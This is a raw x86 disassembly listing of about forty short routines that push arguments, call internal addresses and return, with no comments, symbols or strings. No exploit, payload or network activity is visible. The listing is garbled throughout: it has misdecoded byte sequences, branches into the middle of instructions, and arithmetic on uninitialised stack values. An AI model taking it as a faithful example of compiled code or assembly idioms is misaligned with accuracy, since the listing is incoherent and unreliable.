  4d10be:	adc    DWORD PTR [edi-0x64],0x6a61
  4d10c5:	push   edi
  4d10c6:	push   DWORD PTR [edi+0x80]
  4d10cc:	push   ecx
  4d10cd:	push   DWORD PTR [edi+0xf4]
  4d10d3:	push   ecx
  4d10d4:	call   0x4d0a38
  4d10d9:	add    esp,0x10
  4d10dc:	pop    edi
  4d10dd:	push   edi
  4d10de:	call   0x4d0b30
  4d10e3:	add    esp,0x4
  4d10e6:	pop    edi
  4d10e7:	push   edi
  4d10e8:	push   0x0
  4d10ea:	call   0x4d0acc
  4d10ef:	add    esp,0x4
  4d10f2:	pop    edi
  4d10f3:	add    esp,0x28
  4d10f6:	pop    ebp
  4d10f7:	ret    
  4d10f8:	pop    edi
  4d10f9:	call   DWORD PTR ds:0x4d2024
  4d10ff:	call   edi
  4d1101:	add    BYTE PTR [eax],al
  4d1103:	add    BYTE PTR [edi-0x1],bl
  4d1106:	adc    eax,0x4d2004
  4d110b:	call   edi
  4d110d:	add    BYTE PTR [eax],al
  4d110f:	add    BYTE PTR [edi-0x1],bl
  4d1112:	adc    eax,0x4d2048
  4d1117:	call   edi
  4d1119:	add    BYTE PTR [eax],al
  4d111b:	add    BYTE PTR [edi-0x1],bl
  4d111e:	adc    eax,0x4d203c
  4d1123:	call   edi
  4d1125:	add    BYTE PTR [eax],al
  4d1127:	add    BYTE PTR [edi-0x1],bl
  4d112a:	adc    eax,0x4d208c
  4d112f:	call   edi
  4d1131:	add    BYTE PTR [eax],al
  4d1133:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1139:	sub    esp,0x30
  4d113c:	lea    edx,ds:0x4d3198
  4d1142:	xor    DWORD PTR [ebp-0x1c],eax
  4d1145:	push   edx
  4d1146:	push   DWORD PTR [edx+0x188]
  4d114c:	push   ecx
  4d114d:	push   edi
  4d114e:	call   0x4d083c
  4d1153:	add    esp,0xc
  4d1156:	pop    edx
  4d1157:	push   edx
  4d1158:	lea    edi,[edx-0x198]
  4d115e:	push   edi
  4d115f:	call   0x4d1098
  4d1164:	add    esp,0x4
  4d1167:	test   eax,eax
  4d1169:	jne    0x4d1158
  4d116b:	pop    edx
  4d116c:	push   edx
  4d116d:	mov    esi,0x0
  4d1172:	push   esi
  4d1173:	call   0x4d12b8
  4d1178:	add    esp,0x4
  4d117b:	pop    edx
  4d117c:	add    esp,0x30
  4d117f:	pop    ebp
  4d1180:	ret    
  4d1181:	add    BYTE PTR [eax],al
  4d1183:	add    BYTE PTR [edi-0x1],bl
  4d1186:	adc    eax,0x4d2078
  4d118b:	call   edi
  4d118d:	add    BYTE PTR [eax],al
  4d118f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1195:	sub    esp,0x4c
  4d1198:	lea    ebx,ds:0x4d3074
  4d119e:	sbb    eax,DWORD PTR [ebp-0x4c]
  4d11a1:	call   0x4d0b30
  4d11a6:	add    esp,0x4
  4d11a9:	push   ebx
  4d11aa:	push   esi
  4d11ab:	push   eax
  4d11ac:	call   0x4d0c3c
  4d11b1:	add    esp,0x8
  4d11b4:	pop    ebx
  4d11b5:	mov    ecx,0x0
  4d11ba:	push   ecx
  4d11bb:	call   0x4d0eb4
  4d11c0:	add    esp,0x4
  4d11c3:	add    esp,0x4c
  4d11c6:	pop    ebp
  4d11c7:	ret    
  4d11c8:	mov    edi,edi
  4d11ca:	push   ebp
  4d11cb:	mov    ebp,esp
  4d11cd:	sub    esp,0x38
  4d11d0:	mov    ebx,0x4d3060
  4d11d5:	sbb    DWORD PTR [ebp-0x8],ebx
  4d11d8:	push   0x0
  4d11da:	call   0x4d0eb4
  4d11df:	add    esp,0x4
  4d11e2:	push   ebx
  4d11e3:	push   edx
  4d11e4:	push   DWORD PTR [ebx+0xb4]
  4d11ea:	push   eax
  4d11eb:	push   eax
  4d11ec:	call   0x4d15a4
  4d11f1:	add    esp,0x10
  4d11f4:	pop    ebx
  4d11f5:	push   0x0
  4d11f7:	call   0x4d14f0
  4d11fc:	add    esp,0x4
  4d11ff:	add    esp,0x38
  4d1202:	pop    ebp
  4d1203:	ret    
  4d1204:	pop    edi
  4d1205:	call   DWORD PTR ds:0x4d200c
  4d120b:	call   edi
  4d120d:	add    BYTE PTR [eax],al
  4d120f:	add    BYTE PTR [edi-0x1],bl
  4d1212:	adc    eax,0x4d2094
  4d1217:	call   edi
  4d1219:	add    BYTE PTR [eax],al
  4d121b:	add    BYTE PTR [edi-0x1],bl
  4d121e:	adc    eax,0x4d2040
  4d1223:	call   edi
  4d1225:	add    BYTE PTR [eax],al
  4d1227:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d122d:	sub    esp,0x50
  4d1230:	lea    ebx,[esi+0x184]
  4d1236:	cmp    ebx,0x432e
  4d123c:	jbe    0x4d122b
  4d123e:	push   ebx
  4d123f:	push   edx
  4d1240:	push   DWORD PTR [ebx+0xa4]
  4d1246:	push   DWORD PTR [ebx+0x120]
  4d124c:	call   0x4d09ac
  4d1251:	add    esp,0xc
  4d1254:	pop    ebx
  4d1255:	call   0x4d0a7c
  4d125a:	add    esp,0x4
  4d125d:	lea    esi,[ebx-0x1f0]
  4d1263:	push   esi
  4d1264:	call   0x4d1098
  4d1269:	add    esp,0x4
  4d126c:	test   eax,eax
  4d126e:	jne    0x4d125e
  4d1270:	add    esp,0x50
  4d1273:	pop    ebp
  4d1274:	ret    
  4d1275:	add    BYTE PTR [eax],al
  4d1277:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d127d:	sub    esp,0x54
  4d1280:	lea    esi,[ecx-0x88]
  4d1286:	cmp    esi,0x69f3
  4d128c:	jbe    0x4d127b
  4d128e:	push   0x0
  4d1290:	call   0x4d14f0
  4d1295:	add    esp,0x4
  4d1298:	push   esi
  4d1299:	push   ecx
  4d129a:	push   DWORD PTR [esi+0x1f4]
  4d12a0:	call   0x4d0b98
  4d12a5:	add    esp,0x8
  4d12a8:	pop    esi
  4d12a9:	call   0x4d0a7c
  4d12ae:	add    esp,0x4
  4d12b1:	add    esp,0x54
  4d12b4:	pop    ebp
  4d12b5:	ret    
  4d12b6:	add    BYTE PTR [eax],al
  4d12b8:	pop    edi
  4d12b9:	call   DWORD PTR ds:0x4d2064
  4d12bf:	call   edi
  4d12c1:	add    BYTE PTR [eax],al
  4d12c3:	add    BYTE PTR [edi-0x1],bl
  4d12c6:	adc    eax,0x4d2058
  4d12cb:	call   edi
  4d12cd:	add    BYTE PTR [eax],al
  4d12cf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d12d5:	sub    esp,0x34
  4d12d8:	mov    ecx,0x4d307c
  4d12dd:	sbb    DWORD PTR [ebp-0x24],edx
  4d12e0:	push   ecx
  4d12e1:	push   edx
  4d12e2:	push   eax
  4d12e3:	push   DWORD PTR [ecx+0xf4]
  4d12e9:	call   0x4d14fc
  4d12ee:	add    esp,0xc
  4d12f1:	pop    ecx
  4d12f2:	push   ecx
  4d12f3:	mov    edi,0x0
  4d12f8:	push   edi
  4d12f9:	call   0x4d0eb4
  4d12fe:	add    esp,0x4
  4d1301:	pop    ecx
  4d1302:	push   ecx
  4d1303:	mov    edx,0x0
  4d1308:	push   edx
  4d1309:	call   0x4d08cc
  4d130e:	add    esp,0x4
  4d1311:	pop    ecx
  4d1312:	add    esp,0x34
  4d1315:	pop    ebp
  4d1316:	ret    
  4d1317:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d131d:	sub    esp,0x34
  4d1320:	lea    edi,[eax+0x1c8]
  4d1326:	sub    edx,0xffff8e1f
  4d132c:	push   edi
  4d132d:	push   0x0
  4d132f:	call   0x4d12b8
  4d1334:	add    esp,0x4
  4d1337:	pop    edi
  4d1338:	push   edi
  4d1339:	push   esi
  4d133a:	push   DWORD PTR [edi+0x1dc]
  4d1340:	push   DWORD PTR [edi+0x1c]
  4d1343:	call   0x4d0e7c
  4d1348:	add    esp,0xc
  4d134b:	pop    edi
  4d134c:	push   edi
  4d134d:	mov    eax,0x0
  4d1352:	push   eax
  4d1353:	call   0x4d06f8
  4d1358:	add    esp,0x4
  4d135b:	pop    edi
  4d135c:	add    esp,0x34
  4d135f:	pop    ebp
  4d1360:	ret    
  4d1361:	add    BYTE PTR [eax],al
  4d1363:	add    BYTE PTR [edi-0x1],bl
  4d1366:	adc    eax,0x4d204c
  4d136b:	call   edi
  4d136d:	add    BYTE PTR [eax],al
  4d136f:	add    BYTE PTR [edi-0x1],bl
  4d1372:	adc    eax,0x4d2028
  4d1377:	call   edi
  4d1379:	add    BYTE PTR [eax],al
  4d137b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1381:	sub    esp,0x50
  4d1384:	lea    edi,ds:0x4d3078
  4d138a:	adc    ebx,DWORD PTR [ebp-0x18]
  4d138d:	push   edi
  4d138e:	push   ebx
  4d138f:	push   DWORD PTR [edi+0x174]
  4d1395:	push   eax
  4d1396:	push   esi
  4d1397:	call   0x4d07a8
  4d139c:	add    esp,0x10
  4d139f:	pop    edi
  4d13a0:	push   edi
  4d13a1:	call   0x4d0b18
  4d13a6:	add    esp,0x4
  4d13a9:	pop    edi
  4d13aa:	push   edi
  4d13ab:	push   0x0
  4d13ad:	call   0x4d10f8
  4d13b2:	add    esp,0x4
  4d13b5:	pop    edi
  4d13b6:	add    esp,0x50
  4d13b9:	pop    ebp
  4d13ba:	ret    
  4d13bb:	add    BYTE PTR [edi-0x1],bl
  4d13be:	adc    eax,0x4d2074
  4d13c3:	call   edi
  4d13c5:	add    BYTE PTR [eax],al
  4d13c7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d13cd:	sub    esp,0x30
  4d13d0:	mov    edi,0x4d308c
  4d13d5:	mov    ecx,DWORD PTR [edi+0x50]
  4d13d8:	push   edi
  4d13d9:	push   0x0
  4d13db:	call   0x4d08cc
  4d13e0:	add    esp,0x4
  4d13e3:	pop    edi
  4d13e4:	push   edi
  4d13e5:	push   DWORD PTR [edi+0x134]
  4d13eb:	push   DWORD PTR [edi+0x10]
  4d13ee:	push   esi
  4d13ef:	push   DWORD PTR [edi+0xd8]
  4d13f5:	call   0x4d0cc8
  4d13fa:	add    esp,0x10
  4d13fd:	pop    edi
  4d13fe:	push   edi
  4d13ff:	call   0x4d0b18
  4d1404:	add    esp,0x4
  4d1407:	pop    edi
  4d1408:	add    esp,0x30
  4d140b:	pop    ebp
  4d140c:	ret    
  4d140d:	add    BYTE PTR [eax],al
  4d140f:	add    BYTE PTR [edi-0x1],bl
  4d1412:	adc    eax,0x4d2084
  4d1417:	call   edi
  4d1419:	add    BYTE PTR [eax],al
  4d141b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1421:	sub    esp,0x3c
  4d1424:	lea    esi,ds:0x4d306c
  4d142a:	cmp    esi,0x5ac8
  4d1430:	je     0x4d141f
  4d1432:	push   esi
  4d1433:	push   DWORD PTR [esi+0x4]
  4d1436:	push   DWORD PTR [esi+0x94]
  4d143c:	push   DWORD PTR [esi+0x16c]
  4d1442:	call   0x4d1228
  4d1447:	add    esp,0xc
  4d144a:	pop    esi
  4d144b:	push   0x0
  4d144d:	call   0x4d10f8
  4d1452:	add    esp,0x4
  4d1455:	call   0x4d0a7c
  4d145a:	add    esp,0x4
  4d145d:	add    esp,0x3c
  4d1460:	pop    ebp
  4d1461:	ret    
  4d1462:	add    BYTE PTR [eax],al
  4d1464:	mov    edi,edi
  4d1466:	push   ebp
  4d1467:	mov    ebp,esp
  4d1469:	sub    esp,0x50
  4d146c:	lea    eax,[edx+0xd0]
  4d1472:	xor    ebx,DWORD PTR [ebp-0x40]
  4d1475:	push   eax
  4d1476:	push   0x0
  4d1478:	call   0x4d08cc
  4d147d:	add    esp,0x4
  4d1480:	pop    eax
  4d1481:	push   eax
  4d1482:	push   esi
  4d1483:	push   DWORD PTR [eax+0x8c]
  4d1489:	call   0x4d13c8
  4d148e:	add    esp,0x8
  4d1491:	pop    eax
  4d1492:	push   eax
  4d1493:	push   0x0
  4d1495:	call   0x4d10f8
  4d149a:	add    esp,0x4
  4d149d:	pop    eax
  4d149e:	add    esp,0x50
  4d14a1:	pop    ebp
  4d14a2:	ret    
  4d14a3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d14a9:	sub    esp,0x1c
  4d14ac:	mov    eax,0x4d3020
  4d14b1:	mov    DWORD PTR [ebp-0x1c],ebx
  4d14b4:	push   eax
  4d14b5:	mov    esi,0xfffffff4
  4d14ba:	push   esi
  4d14bb:	call   0x4d1364
  4d14c0:	add    esp,0x4
  4d14c3:	pop    eax
  4d14c4:	push   eax
  4d14c5:	push   DWORD PTR [eax+0xb0]
  4d14cb:	push   DWORD PTR [eax+0x50]
  4d14ce:	push   edi
  4d14cf:	push   DWORD PTR [eax+0xe0]
  4d14d5:	call   0x4d1318
  4d14da:	add    esp,0x10
  4d14dd:	pop    eax
  4d14de:	push   eax
  4d14df:	call   0x4d0b18
  4d14e4:	add    esp,0x4
  4d14e7:	pop    eax
  4d14e8:	add    esp,0x1c
  4d14eb:	pop    ebp
  4d14ec:	ret    
  4d14ed:	add    BYTE PTR [eax],al
  4d14ef:	add    BYTE PTR [edi-0x1],bl
  4d14f2:	adc    eax,0x4d2038
  4d14f7:	call   edi
  4d14f9:	add    BYTE PTR [eax],al
  4d14fb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1501:	sub    esp,0x5c
  4d1504:	lea    ebx,ds:0x4d3030
  4d150a:	mov    DWORD PTR [ebx+0x4c],0x10
  4d1511:	mov    edx,0x0
  4d1516:	push   edx
  4d1517:	call   0x4d06f8
  4d151c:	add    esp,0x4
  4d151f:	push   ebx
  4d1520:	push   DWORD PTR [ebx+0x148]
  4d1526:	push   esi
  4d1527:	push   DWORD PTR [ebx+0x138]
  4d152d:	call   0x4d0ad8
  4d1532:	add    esp,0xc
  4d1535:	pop    ebx
  4d1536:	call   0x4d0b30
  4d153b:	add    esp,0x4
  4d153e:	add    esp,0x5c
  4d1541:	pop    ebp
  4d1542:	ret    
  4d1543:	add    BYTE PTR [edi-0x1],bl
  4d1546:	adc    eax,0x4d2020
  4d154b:	call   edi
  4d154d:	add    BYTE PTR [eax],al
  4d154f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1555:	sub    esp,0x44
  4d1558:	lea    esi,[edx-0x8c]
  4d155e:	xor    edi,DWORD PTR [ebp-0x20]
  4d1561:	push   esi
  4d1562:	push   DWORD PTR [esi+0xec]
  4d1568:	push   DWORD PTR [esi+0xc8]
  4d156e:	push   DWORD PTR [esi+0x168]
  4d1574:	push   edx
  4d1575:	call   0x4d0704
  4d157a:	add    esp,0x10
  4d157d:	pop    esi
  4d157e:	push   0x0
  4d1580:	call   0x4d121c
  4d1585:	add    esp,0x4
  4d1588:	call   0x4d0b30
  4d158d:	add    esp,0x4
  4d1590:	add    esp,0x44
  4d1593:	pop    ebp
  4d1594:	ret    
  4d1595:	add    BYTE PTR [eax],al
  4d1597:	add    BYTE PTR [edi-0x1],bl
  4d159a:	adc    eax,0x4d2080
  4d159f:	call   edi
  4d15a1:	add    BYTE PTR [eax],al
  4d15a3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d15a9:	sub    esp,0x38
  4d15ac:	mov    edi,0x4d304c
  4d15b1:	xor    esi,eax
  4d15b3:	push   edi
  4d15b4:	push   edx
  4d15b5:	push   DWORD PTR [edi+0xd0]
  4d15bb:	push   eax
  4d15bc:	push   DWORD PTR [edi+0xfc]
  4d15c2:	call   0x4d0d64
  4d15c7:	add    esp,0x10
  4d15ca:	pop    edi
  4d15cb:	push   edi
  4d15cc:	call   0x4d0b30
  4d15d1:	add    esp,0x4
  4d15d4:	pop    edi
  4d15d5:	push   edi
  4d15d6:	call   0x4d0b18
  4d15db:	add    esp,0x4
  4d15de:	pop    edi
  4d15df:	add    esp,0x38
  4d15e2:	pop    ebp
  4d15e3:	ret    
